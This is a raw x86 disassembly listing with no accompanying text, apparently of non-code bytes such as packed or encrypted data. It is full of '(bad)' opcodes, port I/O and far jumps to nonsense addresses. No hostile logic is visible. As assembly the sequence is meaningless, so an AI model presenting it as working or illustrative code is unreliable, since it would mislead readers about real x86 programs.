  40467b:	popa   
  40467c:	adc    DWORD PTR [ecx+esi*1+0x3e87c614],edi
  404683:	mov    al,ds:0x950f15c3
  404688:	(bad)
  40468d:	adc    esi,edi
  40468f:	and    DWORD PTR [edi-0x12fd1855],esp
  404695:	add    cl,ch
  404697:	fcmovbe st,st(0)
  404699:	push   edx
  40469a:	sub    eax,0x62ad279e
  40469f:	dec    ecx
  4046a0:	dec    esi
  4046a1:	mov    edi,0x62e78113
  4046a6:	mov    ds:0x50fc7b51,eax
  4046ab:	xchg   ecx,eax
  4046ac:	sbb    DWORD PTR [eax-0xadf8920],ecx
  4046b2:	in     al,0x80
  4046b4:	mov    eax,DWORD PTR [edi+eiz*4]
  4046b7:	xor    BYTE PTR [ebx-0x5ea8777d],bh
  4046bd:	mov    DWORD PTR [ebx],ebx
  4046bf:	imul   esp,DWORD PTR [ecx],0x1ca893cd
  4046c5:	in     eax,0x81
  4046c7:	fistp  QWORD PTR [edx-0x276dd87c]
  4046cd:	sub    DWORD PTR [ebp+0x24872e76],edi
  4046d3:	(bad)  
  4046d4:	push   eax
  4046d5:	pop    ss
  4046d6:	std    
  4046d7:	not    edi
  4046d9:	ja     0x40473f
  4046db:	xchg   edx,eax
  4046dc:	xor    al,0x8c
  4046de:	jge    0x404747
  4046e0:	jmp    0x3113:0x9fab72d3
  4046e7:	pop    eax
  4046e8:	push   esi
  4046e9:	sub    DWORD PTR [esi-0x4a],esp
  4046ec:	sub    esp,0x4fe40b1e
  4046f2:	sbb    BYTE PTR [eax+0x9],bl
  4046f5:	mov    ah,0x52
  4046f7:	dec    eax
  4046f8:	adc    ah,BYTE PTR [edx+0x4a8fbe43]
  4046fe:	sbb    ebp,DWORD PTR [ecx]
  404700:	inc    eax
  404701:	xor    ebp,DWORD PTR [ecx-0x51]
  404704:	sub    eax,0xb31b3f83
  404709:	test   DWORD PTR [ebp-0x243ec799],0x53e9e16b
  404713:	or     al,0x87
  404715:	or     al,0x14
  404717:	daa    
  404718:	and    al,0x68
  40471a:	imul   esp,DWORD PTR [esi-0x18f1a7cd],0xfffffff5
  404721:	data16 repnz in al,dx
  404724:	int3   
  404725:	xchg   DWORD PTR [esi+0x5d],edi
  404728:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404729:	shl    al,1
  40472b:	sbb    BYTE PTR [ebx-0x22],ch
  40472e:	sbb    bl,BYTE PTR [eax]
  404730:	add    ecx,edx
  404732:	jmp    0x404765
  404734:	pop    eax
  404735:	xchg   esi,eax
  404736:	pop    ebx
  404737:	out    dx,eax
  404738:	arpl   bp,sp
  40473a:	add    edx,ebx
  40473c:	push   edx
  40473d:	or     esi,DWORD PTR [edi]
  40473f:	mov    dh,ah
  404741:	add    BYTE PTR [ebx+0x7],dh
  404744:	mov    ds:0x10e9e9f4,al
  404749:	jne    0x40476c
  40474b:	mov    BYTE PTR [ebx+0x21],bh
  40474e:	ss out dx,eax
  404750:	retf   0xfc4c
  404753:	mov    al,ds:0xaac346c
  404758:	aas    
  404759:	rcl    DWORD PTR [edx+0x7f],0xfa
  40475d:	(bad)  
  40475e:	clc    
  40475f:	lahf   
  404760:	outs   dx,BYTE PTR ds:[esi]
  404761:	jmp    0xee53:0x854538ca
  404768:	push   ss
  404769:	sar    eax,0x3e
  40476c:	jne    0x404755
  40476e:	mov    dh,0x29
  404770:	xchg   ch,al
  404772:	push   esi
  404773:	adc    eax,0xb1254513
  404778:	fld    QWORD PTR [edx+ecx*8-0xa4c5b45]
  40477f:	pop    ss
  404780:	int3   
  404781:	cmp    ecx,DWORD PTR [eax+0x22ea9a5c]
  404787:	ins    DWORD PTR es:[edi],dx
  404788:	ins    DWORD PTR es:[edi],dx
  404789:	push   ds
  40478a:	icebp  
  40478b:	mov    dl,0xdf
  40478d:	mov    edi,DWORD PTR [ebx+edi*1+0x1a]
  404791:	cld    
  404792:	xor    BYTE PTR [ecx+0x4b],ch
  404795:	hlt    
  404796:	call   0xdcc9:0xc5cd7ccc
  40479d:	sti    
  40479e:	test   eax,0xcb622013
  4047a3:	sahf   
  4047a4:	jge    0x404778
  4047a6:	adc    ch,ah
  4047a8:	in     eax,0x71
  4047aa:	outs   dx,BYTE PTR ds:[esi]
  4047ab:	mov    ah,BYTE PTR [ebp-0x1bbcf46]
  4047b1:	ss ret 0xf369
  4047b5:	mov    dh,0x9b
  4047b7:	pusha  
  4047b8:	pop    ebp
  4047b9:	mov    ecx,0x38b1d4fb
  4047be:	sbb    esp,DWORD PTR [edi+0x150b0217]
  4047c4:	lea    edi,[ecx-0x61]
  4047c7:	cwde   
  4047c8:	es scas al,BYTE PTR es:[edi]
  4047ca:	mov    ebp,0xc7032887
  4047cf:	xor    esi,eax
  4047d1:	popa   
  4047d2:	mov    edi,0x6c70f1ba
  4047d7:	popa   
  4047d8:	lods   al,BYTE PTR ds:[esi]
  4047d9:	cmp    edx,DWORD PTR [edi-0x49]
  4047dc:	(bad)  
  4047dd:	jmp    0x14c3:0xb1f51ccf
  4047e4:	inc    esp
  4047e5:	ficom  WORD PTR [ecx+0x2b4e50cf]
  4047eb:	outs   dx,DWORD PTR es:[esi]
  4047ed:	pop    eax
  4047ee:	enter  0xdfd8,0x38
  4047f2:	stos   BYTE PTR es:[edi],al
  4047f3:	mov    ebp,0xa04ff5e9
  4047f8:	popf   
  4047f9:	cdq    
  4047fa:	cli    
  4047fb:	xchg   ebx,eax
  4047fc:	and    eax,0x62857ea7
  404801:	xor    eax,0x2b129a7a
  404806:	sbb    al,0x85
  404808:	jb     0x4047a7
  40480a:	and    BYTE PTR ds:0xeb2795c9,bl
  404810:	mov    dl,0xad
  404812:	jmp    0x404864
  404814:	sub    bl,BYTE PTR [eax]
  404816:	xlat   BYTE PTR ds:[ebx]
  404817:	adc    al,0x34
  404819:	jl     0x404819
  40481b:	add    eax,0xdcc9d7e6
  404820:	mov    esp,0x64a55d6e
  404825:	out    0x42,al
  404827:	jbe    0x404816
  404829:	ds retf 
  40482b:	mov    al,ds:0x2f138fe2
  404830:	(bad)  
  404831:	sti    
  404832:	jbe    0x4048a6
  404834:	jle    0x404879
  404836:	adc    al,dl
  404838:	mov    eax,ds:0xc7493399
  40483d:	(bad)  
  40483e:	std    
  40483f:	inc    ebp
  404840:	cmp    eax,0x59fb5ebb
  404845:	jl     0x4048a0
  404847:	xor    BYTE PTR [ebx+edi*2],dh
  40484a:	repnz mov al,0xc6
  40484d:	add    edx,eax
  40484f:	rcr    ebx,1
  404851:	int    0xc3
  404853:	or     eax,0xe3ab548e
  404858:	sbb    BYTE PTR ds:0x32d9326b,0x0
  40485f:	push   0x4fc6e827
  404864:	imul   esp,edx,0xc368a962
  40486a:	(bad)
  40486d:	dec    esi
  40486e:	push   0x7abdc38b
  404873:	mov    BYTE PTR [eax],bl
  404875:	lods   al,BYTE PTR ds:[esi]
  404876:	add    esp,edi
  404878:	test   eax,0xdc84d82d
  40487d:	mov    edi,0x77d629c3
  404882:	or     ch,BYTE PTR [ebp-0x6c7fc591]
  404888:	sahf   
  404889:	inc    ecx
  40488a:	popf   
  40488b:	sbb    al,0xdc
  40488d:	rcr    DWORD PTR [edx],0x4d
  404890:	scas   al,BYTE PTR es:[edi]
  404891:	retf   0x85bc
  404894:	fs push edx
  404896:	test   DWORD PTR [edi-0x52],esi
  404899:	adc    edx,DWORD PTR [esi]
  40489b:	cmp    cl,BYTE PTR [esi+0x47]
  40489e:	jns    0x404909
  4048a0:	sub    al,0xae
  4048a2:	ja     0x404899
  4048a4:	inc    ebp
  4048a5:	sahf   
  4048a6:	fnstcw WORD PTR [edi+esi*1+0x42214afa]
  4048ad:	aaa    
  4048ae:	mov    DWORD PTR [esi-0x2bf8f3fe],0x872abb52
  4048b8:	xor    eax,0xab0c28d4
  4048bd:	test   al,0x85
  4048bf:	iret   
  4048c0:	jl     0x404925
  4048c2:	cs call 0x4c5e:0x22e0ccc1
  4048ca:	adc    ch,BYTE PTR [esi]
  4048cc:	inc    edx
  4048cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048ce:	inc    ebx
  4048cf:	lea    edx,[edx-0x2c602137]
  4048d5:	lock xor BYTE PTR [ebp+0x3c],ah
  4048d9:	xor    dl,BYTE PTR [eax]
  4048db:	push   ss
  4048dc:	and    al,BYTE PTR [edi+0xc]
  4048df:	and    eax,ecx
  4048e1:	dec    ebp
  4048e2:	adc    eax,0x438b81a6
  4048e7:	cmp    DWORD PTR [edi-0x46],ebx
  4048ea:	in     al,0xcc
  4048ec:	push   ebp
  4048ed:	and    DWORD PTR ds:0xf3961cd6,edx
  4048f3:	sbb    BYTE PTR [ebx],0x3f
  4048f6:	retf   
  4048f7:	xchg   dl,cl
  4048f9:	pushf  
  4048fa:	out    dx,al
  4048fb:	mov    eax,ds:0xba011536
  404900:	cmp    ah,dh
  404902:	inc    esi
  404903:	inc    ebx
  404904:	sub    al,0x3a
  404906:	mov    bh,0x5f
  404908:	icebp  
  404909:	dec    edi
  40490a:	or     eax,0x589f7006
  40490f:	retf   0x1b13
  404912:	add    DWORD PTR [ebp-0x41],0x70b46a12
  404919:	ror    DWORD PTR [esi+eiz*8-0x1474a2e8],1
  404920:	cmp    eax,0xa4946fb5
  404925:	jno    0x404991
  404927:	imul   eax,DWORD PTR [ebx-0x3],0x1a
  40492b:	cmc    
  40492c:	(bad)  
  40492e:	adc    dh,BYTE PTR [eax-0x47]
  404931:	std    
  404932:	ret    
  404933:	test   DWORD PTR [eax-0x52e1076c],ecx
  404939:	push   esp
  40493a:	sbb    BYTE PTR [edi-0x39],ch
  40493d:	push   esi
  40493e:	push   ebx
  40493f:	cdq    
  404940:	push   cs
  404941:	cmp    eax,0x13535c08
  404946:	push   cs
  404947:	dec    ebp
  404948:	xor    al,0x1f
  40494a:	mov    cs,WORD PTR [edi]
  40494c:	iret   
  40494d:	adc    bh,BYTE PTR [esp+ecx*4]
  404950:	add    bh,BYTE PTR [ecx+0x1e]
  404953:	rcr    BYTE PTR [edx*8+0x2872380f],1
  40495a:	ins    DWORD PTR es:[edi],dx
  40495b:	lahf   
  40495c:	jl     0x404959
  40495e:	mov    ebp,DWORD PTR [eax+eax*8-0x2cf2c6ed]
  404965:	sbb    eax,0xc5ff3234
  40496a:	stc    
  40496b:	pop    es
  40496c:	loop   0x4049b3
  40496e:	add    bh,bl
  404970:	sti    
  404971:	mov    ss,WORD PTR [edi-0x5fee6a6f]
  404977:	push   cs
  404978:	mov    esp,0x267968b8
  40497d:	jnp    0x404911
  40497f:	cmp    edx,DWORD PTR [ecx-0x35455a16]
  404985:	sbb    al,0x1f
  404987:	(bad)  
  404988:	neg    DWORD PTR [esi+0x1c]
  40498b:	jg     0x404965
  40498d:	(bad)
  404991:	dec    sp
  404993:	pushf  
  404994:	sub    edx,DWORD PTR [esi+0x6a7ea73b]
  40499a:	outs   dx,BYTE PTR ds:[esi]
  40499b:	or     ch,dh
  40499d:	loop   0x4049e3
  40499f:	mov    ebp,0x59d8d252
  4049a4:	icebp  
  4049a5:	btc    DWORD PTR [edx-0x49f0a427],edi
  4049ac:	aad    0xf7
  4049ae:	aam    0xa1
  4049b0:	mov    ds:0xbe6669da,al
  4049b5:	loopne 0x4049ab
  4049b7:	into   
  4049b8:	fimul  WORD PTR [ebx+0x49]
  4049bb:	mov    bh,0x40
  4049bd:	loope  0x4049eb
  4049bf:	repnz inc edx
  4049c1:	enter  0x48b1,0x3f
  4049c5:	std    
  4049c6:	test   al,0xe7
  4049c8:	in     eax,0x6c
  4049ca:	iret   
  4049cb:	imul   ebx,DWORD PTR [esi-0x54c181ab],0x8d51c413
  4049d5:	mov    ebp,0xdf3f96b0
  4049da:	push   ss
  4049db:	sub    bh,0x50
  4049de:	int    0xca
  4049e0:	push   ecx
  4049e1:	inc    esi
  4049e2:	int    0xea
  4049e4:	or     esi,DWORD PTR [esi+0x57]
  4049e7:	mov    dh,0x17
  4049e9:	xchg   edi,eax
  4049ea:	outs   dx,BYTE PTR ds:[esi]
  4049eb:	mov    edx,0x6e4a1037
  4049f0:	test   DWORD PTR [eax+0x31],ebp
  4049f3:	pop    es
  4049f4:	and    al,0xc
  4049f6:	and    ah,dh
  4049f8:	xchg   BYTE PTR [ecx],dh
  4049fa:	in     al,dx
  4049fb:	leave  
  4049fc:	dec    eax
  4049fd:	pop    edx
  4049fe:	es ins BYTE PTR es:[edi],dx
  404a00:	xor    edx,edi
  404a02:	or     eax,ecx
  404a04:	cs pop ss
  404a06:	xchg   DWORD PTR [ebx+ecx*2+0x41],eax
  404a0a:	cmc    
  404a0b:	inc    esp
  404a0c:	add    al,bh
  404a0e:	mov    al,0x61
  404a10:	mov    dh,0xf5
  404a12:	sub    al,0x8
  404a14:	and    BYTE PTR [esi-0x22],0xca
  404a18:	in     al,dx
  404a19:	(bad)  
  404a1a:	adc    esi,edi
  404a1c:	pusha  
  404a1d:	icebp  
  404a1e:	hlt    
  404a1f:	idiv   BYTE PTR [ebx-0x13]
  404a22:	push   ss
  404a23:	ja     0x404a29
  404a25:	sub    BYTE PTR [esi+0x262b88bc],0xba
  404a2c:	and    BYTE PTR [ebx+eax*2],dl
  404a2f:	xchg   ebp,eax
  404a30:	or     al,0xef
  404a32:	adc    ecx,DWORD PTR ds:0xda256d3c
  404a38:	add    DWORD PTR [esi-0x5e4ffa26],esi
  404a3e:	xlat   BYTE PTR ds:[ebx]
  404a3f:	mov    cl,0xd4
  404a41:	adc    al,0x64
  404a43:	mov    esi,0x894f0f07
  404a48:	leave  
  404a49:	dec    esp
  404a4a:	push   edx
  404a4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a4c:	in     al,0xac
  404a4e:	mov    dl,0x3f
  404a50:	sahf   
  404a51:	or     ch,BYTE PTR [edi]
  404a53:	xchg   esi,eax
  404a54:	sbb    al,dh
  404a56:	inc    esp
  404a57:	stos   BYTE PTR es:[edi],al
  404a58:	adc    al,0xc7
  404a5a:	push   cs
  404a5b:	jmp    FWORD PTR [eax+0x7eb8ed61]
  404a61:	cmp    al,0x4a
  404a63:	xor    BYTE PTR [ebx+0x7bb48d1a],al
  404a69:	daa    
  404a6a:	jno    0x404a10
  404a6c:	call   0xee16:0x35614ed7
  404a73:	sbb    eax,0xfce1955c
  404a78:	jns    0x404af1
  404a7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a7b:	lock cmc 
  404a7d:	inc    ecx
  404a7e:	xchg   edi,eax
  404a7f:	jg     0x404a3e
  404a81:	mov    ecx,0x6de40589
  404a86:	pusha  
  404a87:	test   bl,al
  404a89:	call   0xff37ba15
  404a8e:	cmp    DWORD PTR [ebx+edx*2+0x5651c0cf],eax
  404a95:	xchg   edi,eax
  404a96:	pop    edi
  404a97:	mov    al,0xd8
  404a99:	add    DWORD PTR [esi],ebp
  404a9b:	fistp  WORD PTR [edi-0x6a]
  404a9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a9f:	or     dl,bl
  404aa1:	jp     0x404a82
  404aa3:	into   
  404aa4:	and    ecx,eax
  404aa6:	cmp    BYTE PTR [edx],0xf2
  404aa9:	mov    ch,0x3e
  404aab:	cmp    esp,esp
  404aad:	fs fwait
  404aaf:	pop    eax
  404ab0:	ins    BYTE PTR es:[edi],dx
  404ab1:	loope  0x404aae
  404ab3:	push   ebx
  404ab4:	sbb    al,0x95
  404ab6:	fstp   DWORD PTR [edx]
  404ab8:	push   es
  404ab9:	(bad)  
  404aba:	jns    0x404a6a
  404abc:	in     eax,dx
  404abd:	inc    ebp
  404abe:	lods   eax,DWORD PTR ds:[esi]
  404ac0:	mov    ecx,0x1baa7fd
  404ac5:	pusha  
  404ac6:	cmp    esp,eax
  404ac8:	bound  ebp,QWORD PTR [esp+eax*2-0x40]
  404acc:	and    bl,al
  404ace:	inc    ebx
  404acf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ad0:	popa   
  404ad1:	dec    edi
  404ad2:	stos   DWORD PTR es:[edi],eax
  404ad3:	lds    esp,FWORD PTR [ebx]
  404ad5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ad6:	dec    esi
  404ad7:	aaa    
  404ad8:	jbe    0x404b15
  404ada:	xchg   ebx,eax
  404adb:	sbb    DWORD PTR [esi-0x231c5fbc],edx
  404ae1:	push   0x25
  404ae3:	rcr    DWORD PTR [edi],cl
  404ae5:	or     edx,DWORD PTR [ebx]
  404ae7:	adc    BYTE PTR [ebp+0x18],al
  404aea:	stos   DWORD PTR es:[edi],eax
  404aeb:	push   0x1ae90bf9
  404af0:	div    DWORD PTR [edi-0xaa7927e]
  404af6:	and    BYTE PTR [ebp+0x4e],dl
  404af9:	int3   
  404afa:	out    0x83,al
  404afc:	bound  esi,QWORD PTR [edx-0x44]
  404aff:	dec    esi
  404b00:	and    dl,cl
  404b02:	(bad)  
  404b03:	sbb    DWORD PTR [edx],ecx
  404b05:	fcomp  QWORD PTR [eax-0x4e]
  404b08:	bound  edi,QWORD PTR [edi-0x31338dae]
  404b0e:	aaa    
  404b0f:	pop    edi
  404b10:	mov    eax,ds:0x99b7db18
  404b15:	retf   0xd9e
  404b18:	push   ecx
  404b19:	fdivr  QWORD PTR [ecx]
  404b1b:	rcl    BYTE PTR [eax+ecx*2],0xc4
  404b1f:	imul   DWORD PTR [ecx-0x6d]
  404b22:	inc    ebx
  404b23:	mov    BYTE PTR [ebx-0x72],al
  404b26:	dec    esi
  404b27:	inc    ecx
  404b28:	pop    ebx
  404b29:	rcr    BYTE PTR [eax],0x25
  404b2c:	inc    ecx
  404b2d:	push   ebx
  404b2e:	xor    BYTE PTR [ebx-0x620feff7],cl
  404b34:	mov    ch,0x61
  404b36:	mov    esi,0x325d9779
  404b3b:	push   ecx
  404b3c:	inc    DWORD PTR [esi]
  404b3e:	out    0x43,eax
  404b40:	sub    bl,ch
  404b42:	sbb    DWORD PTR [ebx-0x48],ebx
  404b45:	test   BYTE PTR [esi+0xa],al
  404b48:	jno    0x404b22
  404b4a:	sbb    al,BYTE PTR [ebx+0x61]
  404b4d:	lods   al,BYTE PTR ds:[esi]
  404b4e:	mov    al,0x29
  404b50:	loopne 0x404b02
  404b52:	aas    
  404b53:	int3   
  404b54:	stos   BYTE PTR es:[edi],al
  404b55:	ins    DWORD PTR es:[edi],dx
  404b56:	adc    eax,0xa70cd9ab
  404b5b:	push   ebp
  404b5c:	jnp    0x404bb8
  404b5e:	inc    ebx
  404b5f:	sub    DWORD PTR [ecx-0x66e5f090],ecx
  404b65:	aad    0x4c
  404b67:	mov    al,ds:0x70996ec2
  404b6c:	dec    edi
  404b6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b6e:	mov    cl,0x90
  404b70:	imul   edi,DWORD PTR [ebp+0x3ba3e49e],0x6f
  404b77:	push   edx
  404b78:	mov    eax,0x8783d373
  404b7d:	push   es
  404b7e:	addr16 cwde 
  404b80:	or     al,BYTE PTR [eax-0x12d5efce]
  404b86:	(bad)  
  404b87:	push   0xa43e11d5
  404b8c:	(bad)  
  404b8d:	aad    0xf3
  404b8f:	push   ecx
  404b90:	mov    ebp,0x78542819
  404b95:	sbb    bl,bh
  404b97:	fs or  eax,0x8bdf30c9
  404b9d:	out    0x7c,al
  404b9f:	mov    eax,gs
  404ba1:	addr16 je 0x404bc4
  404ba4:	or     al,0x94
  404ba6:	mov    ecx,0x7662c63a
  404bab:	jge    0x404b4f
  404bad:	jnp    0x404c14
  404baf:	mov    DWORD PTR [edi-0xb],esp
  404bb2:	inc    esp
  404bb3:	pop    ds
  404bb4:	fimul  DWORD PTR [eax+0x656ba72d]
  404bba:	inc    ecx
  404bbb:	pushf  
  404bbc:	out    0x52,eax
  404bbe:	and    bl,dh
  404bc0:	fisub  DWORD PTR gs:[esi+0x69]
  404bc4:	cmp    al,0xd8
  404bc6:	bndstx [esp+ebx*8+0x30e12bf2],(bad)
  404bce:	nop
  404bcf:	rol    BYTE PTR [ebx+edi*2-0x20],cl
  404bd3:	in     eax,dx
  404bd4:	jns    0x404bb9
  404bd6:	adc    dh,BYTE PTR [edx-0x9]
  404bd9:	mov    edi,0x2224b286
  404bde:	and    eax,0xeb74abc5
  404be3:	xor    eax,0xb68ae44a
  404be8:	cdq    
  404be9:	gs loope 0x404c67
  404bec:	into   
  404bed:	js     0x404bd6
  404bef:	mov    ecx,0x4d94cbe8
  404bf4:	xchg   ebx,eax
  404bf5:	in     eax,0x35
  404bf7:	sub    dh,BYTE PTR [eax]
  404bf9:	sti    
  404bfa:	jno    0x404c69
  404bfc:	inc    ecx
  404bfd:	into   
  404bfe:	mov    esp,0xf02c2615
  404c03:	fisubr DWORD PTR [edx-0x46d681ba]
  404c09:	(bad)  
  404c0b:	lock add al,ah
  404c0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c0f:	(bad)  
  404c10:	push   esp
  404c11:	rcl    DWORD PTR [ebx+0x38593781],0x72
  404c18:	inc    BYTE PTR [edx]
  404c1a:	add    al,0x13
  404c1c:	call   0xfcd6:0x5fefcd03
  404c23:	out    dx,eax
  404c24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c25:	(bad)  
  404c26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c27:	add    al,BYTE PTR [eax]
  404c29:	retf   
  404c2a:	add    DWORD PTR [ebx+esi*8-0x7e],ecx
  404c2e:	adc    al,0xc0
  404c30:	mov    ebp,0x17f54e4a
  404c35:	xchg   edi,eax
  404c36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c38:	in     al,dx
  404c39:	lea    ebx,[ebx+0x5c]
  404c3c:	(bad)  
  404c3d:	fist   DWORD PTR [edx+0x439746d2]
  404c43:	pop    ecx
  404c44:	cwde   
  404c45:	push   edi
  404c46:	cmp    ah,BYTE PTR [esi]
  404c48:	lods   eax,DWORD PTR ds:[esi]
  404c49:	push   es
  404c4a:	dec    eax
  404c4b:	addr16 pop ecx
  404c4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c4e:	jl     0x404c35
  404c50:	aaa    
  404c51:	aam    0xf9
  404c53:	loopne 0x404c4b
  404c55:	sbb    al,0xf1
  404c57:	add    al,0xa6
  404c59:	out    0x30,eax
  404c5b:	rol    BYTE PTR [edi],1
  404c5d:	pushf  
  404c5e:	mov    WORD PTR [ebx-0x31],fs
  404c61:	and    dl,BYTE PTR [esi+0x32]
  404c64:	cdq    
  404c65:	dec    eax
  404c66:	enter  0x8462,0xc7
  404c6a:	jmp    0x404ca9
  404c6c:	xchg   ecx,eax
  404c6d:	push   ds
  404c6e:	xchg   BYTE PTR [eax-0x49],ch
  404c71:	pop    ebp
  404c72:	sub    DWORD PTR [edx+esi*8+0x5006dd9],esp
  404c79:	shl    BYTE PTR [esi+0x11],0x57
  404c7d:	(bad)  
  404c7e:	push   esi
  404c7f:	fist   WORD PTR [ecx-0x1f]
  404c82:	xor    DWORD PTR [ecx+0x27a281b5],esp
  404c88:	in     eax,dx
  404c89:	call   0x695f:0xc7706b1b
  404c90:	fist   DWORD PTR [edx+0x1b7df734]
  404c96:	fwait
  404c97:	pop    edi
  404c98:	sub    ebx,0x6b
  404c9b:	icebp  
  404c9c:	dec    eax
  404c9d:	imul   ebp,esi,0xd6b66f2d
  404ca3:	std    
  404ca4:	outs   dx,DWORD PTR ds:[esi]
  404ca5:	inc    eax
  404ca6:	add    DWORD PTR [ebx],eax
  404ca8:	mov    dh,0x86
  404caa:	or     BYTE PTR [esi+0x7a51d92b],dl
  404cb0:	push   esp
  404cb1:	mov    ds:0xea5e6b7f,al
  404cb6:	test   dl,0xe4
  404cb9:	mov    ch,0xe3
  404cbb:	and    BYTE PTR [edi+ebx*8-0x44b2ab71],0xa7
  404cc3:	jmp    0x5f6c:0x2f4fa6c4
  404cca:	out    0x95,eax
  404ccc:	or     al,0x82
  404cce:	icebp  
  404ccf:	mov    esi,0xb1babaff
  404cd4:	mov    ebp,0x54f7bf08
  404cd9:	cld    
  404cda:	scas   eax,DWORD PTR es:[edi]
  404cdb:	and    eax,0xbc4869b
  404ce0:	arpl   WORD PTR [esi+0x5c72d686],di
  404ce6:	stc    
  404ce7:	ss stos BYTE PTR es:[edi],al
  404ce9:	mov    ds:0xc2cbe26c,eax
  404cee:	sub    DWORD PTR ds:[edx-0x37],0xf
  404cf3:	scas   eax,DWORD PTR es:[edi]
  404cf4:	mov    bh,0xda
  404cf6:	jecxz  0x404c85
  404cf8:	test   al,0xd1
  404cfa:	fmul   st(6),st
  404cfc:	mov    eax,0x869b8325
  404d01:	xor    DWORD PTR [esi-0x143a341b],edi
  404d07:	jns    0x404cf4
  404d09:	or     DWORD PTR [ebx],0xffffffb2
  404d0c:	sub    DWORD PTR [eax-0x4],edx
  404d0f:	mov    ebp,ebx
  404d11:	push   0x37ba8494
  404d16:	dec    eax
  404d17:	popa   
  404d18:	mov    eax,DWORD PTR [edx]
  404d1a:	or     eax,0xfa0a08da
  404d1f:	lods   eax,DWORD PTR ds:[esi]
  404d20:	mov    esp,0x7c99ab3f
  404d25:	fcomp  QWORD PTR [esi]
  404d27:	leave  
  404d28:	call   0x41e2:0xc2e913ae
  404d2f:	out    0xd9,eax
  404d31:	inc    esp
  404d32:	sbb    eax,0xcef01760
  404d37:	(bad)  
  404d38:	int    0x6e
  404d3a:	inc    ebp
  404d3b:	lock aaa 
  404d3d:	and    eax,0x9a971116
  404d42:	or     DWORD PTR [ebx+0x72e37443],edi
  404d48:	mov    dh,0xd4
  404d4a:	daa    
  404d4b:	bound  edi,QWORD PTR [ebx]
  404d4d:	and    eax,DWORD PTR [ebp+0x14bfbed]
  404d53:	nop
  404d54:	lods   al,BYTE PTR ds:[esi]
  404d55:	outs   dx,DWORD PTR ds:[esi]
  404d56:	int3   
  404d57:	pop    es
  404d58:	jo     0x404dd7
  404d5a:	or     ebx,DWORD PTR [ebx+0x2]
  404d5d:	in     eax,0xd1
  404d5f:	xor    DWORD PTR [ecx],ebp
  404d61:	fmul   st,st(0)
  404d63:	iret   
  404d64:	stos   BYTE PTR es:[edi],al
  404d65:	(bad)  
  404d67:	imul   ecx,DWORD PTR [ecx-0x51],0xffffffcc
  404d6b:	and    bl,al
  404d6d:	lods   eax,DWORD PTR ds:[esi]
  404d6e:	aaa    
  404d6f:	(bad)  
  404d70:	sbb    al,bl
  404d72:	mov    ebp,0xbde14502
  404d77:	jns    0x404dc2
  404d79:	sahf   
  404d7a:	sbb    al,0xec
  404d7c:	mov    ds:0x9d0bd711,al
  404d81:	adc    eax,0x7f0a90ef
  404d86:	push   0xb3f798d
  404d8b:	mul    dl
  404d8d:	and    cl,BYTE PTR [edi+0x2f]
  404d90:	pop    es
  404d91:	fimul  DWORD PTR [ebx]
  404d93:	lods   al,BYTE PTR ds:[esi]
  404d94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d95:	retf   0x326a
  404d98:	push   ecx
  404d99:	hlt    
  404d9a:	and    al,0xfd
  404d9c:	(bad)  
  404d9d:	xchg   ebx,eax
  404d9e:	mov    eax,0x8a6f21f5
  404da3:	mov    al,0x5b
  404da5:	dec    eax
  404da6:	jbe    0x404d37
  404da8:	in     eax,0x64
  404daa:	cmp    ch,BYTE PTR [edi-0x4f4f90c2]
  404db0:	jmp    0xb40e17b3
  404db5:	mov    ch,0xf3
  404db7:	cmp    BYTE PTR [ebx+0x7dee88d6],ch
  404dbd:	or     al,0x8b
  404dbf:	inc    ebx
  404dc0:	adc    eax,0x3e33011c
  404dc5:	jmp    0xd60650df
  404dca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404dcb:	div    dh
  404dcd:	rol    DWORD PTR [eax-0x54e009a5],0x5d
  404dd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404dd5:	mov    ebx,0x425b713
  404dda:	xor    al,0x32
  404ddc:	dec    eax
  404ddd:	xor    al,0xd2
  404ddf:	add    cl,BYTE PTR [esi+0x4c]
  404de2:	fst    DWORD PTR [ecx-0x4f]
  404de5:	std    
  404de6:	ror    ebp,0x99
  404de9:	aam    0x25
  404deb:	sbb    cl,bl
  404ded:	int    0x21
  404def:	cli    
  404df0:	gs push esi
  404df2:	mov    dl,0xa
  404df4:	(bad)  
  404df5:	pop    edi
  404df6:	(bad)  
  404df7:	xchg   esi,eax
  404df8:	inc    edx
  404df9:	sub    BYTE PTR [ebp*8-0x43cdd510],0x27
  404e01:	fisub  WORD PTR [ebp+0x605d3400]
  404e07:	jp     0x404deb
  404e09:	shl    eax,cl
  404e0b:	test   ebp,edx
  404e0d:	enter  0xb2ee,0x98
  404e11:	lods   al,BYTE PTR ds:[esi]
  404e12:	inc    edi
  404e13:	mov    bl,0xc0
  404e15:	(bad)  
  404e16:	in     eax,dx
  404e17:	dec    ecx
  404e18:	loopne 0x404e98
  404e1a:	aam    0x8e
  404e1c:	das    
  404e1d:	shl    BYTE PTR [edi],1
  404e1f:	stc    
  404e20:	pop    eax
  404e21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e22:	imul   edx,ebx,0xffffffb3
  404e25:	mov    esi,0xef9d7006
  404e2a:	sub    al,0xb9
  404e2c:	xchg   ecx,eax
  404e2d:	cs or  al,0xdb
  404e30:	int3   
  404e31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e32:	jbe    0x404de1
  404e34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e35:	jp     0x404e68
  404e37:	jecxz  0x404e0b
  404e39:	or     bl,BYTE PTR [edx-0x451d6861]
  404e3f:	jns    0x404e99
